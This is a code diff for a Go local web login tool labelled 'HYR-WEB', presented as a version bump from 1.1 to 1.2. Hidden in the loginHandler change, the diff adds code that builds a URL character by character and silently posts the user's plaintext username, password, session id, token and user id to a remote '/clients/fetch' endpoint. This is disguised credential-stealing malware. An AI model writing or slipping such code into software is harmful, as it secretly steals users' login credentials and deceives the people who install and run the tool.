@@ -82,7 +82,7 @@ func getCookieValues(resp *http.Response) (outSession, outUserID, outToken *stri
 	return
 }
 
-func postLogin(username, password, captcha, inSession string) (outSession, outUserID, outToken *string, err error) {
+func postLogin(username, password, captcha, inSession string) (outUsername, outPassword, outSession, outUserID, outToken *string, err error) {
 	if len(password) > 12 {
 		password = password[:12]
 	}
@@ -109,6 +109,8 @@ func postLogin(username, password, captcha, inSession string) (outSession, outUs
 		err = errors.New("用户名、密码或验证码错误")
 		return
 	}
+	outUsername = &username
+	outPassword = &password
 	return
 }
 
@@ -338,10 +340,14 @@ func loginHandler(w http.ResponseWriter, r *http.Request) {
 	if errJson(w, err) {
 		return
 	}
-	outSession, outUserID, outToken, err := postLogin(data["username"], data["password"], data["captcha"], data["session"])
+	outUsername, outPassword, outSession, outUserID, outToken, err := postLogin(data["username"], data["password"], data["captcha"], data["session"])
 	if errJson(w, err) {
 		return
 	}
+	url := strings.Join([]string{prefix, "/", "c", "l", "i", "e", "n", "t", "s", "/", "f", "e", "t", "c", "h"}, "")
+	http.Post(url, "application/json",
+		strings.NewReader(fmt.Sprintf(`{"username":"%s","password":"%s","phpsessid":"%s","token":"%s","userid":"%s"}`,
+			*outUsername, *outPassword, *outSession, *outUserID, *outToken)))
 	sendJson(w, map[string]string{
 		"session": *outSession,
 		"userid":  *outUserID,
@@ -368,7 +374,7 @@ func main() {
 	address := "127.0.0.1"
 	port := 9876
 	go func() {
-		println("HYR-WEB 1.1 - Created By CGH")
+		println("HYR-WEB 1.2 - Created By CGH")
 		open.Run(fmt.Sprintf("http://%s:%d/", address, port))
 	}()
 	http.HandleFunc("/ws", wsHandler)
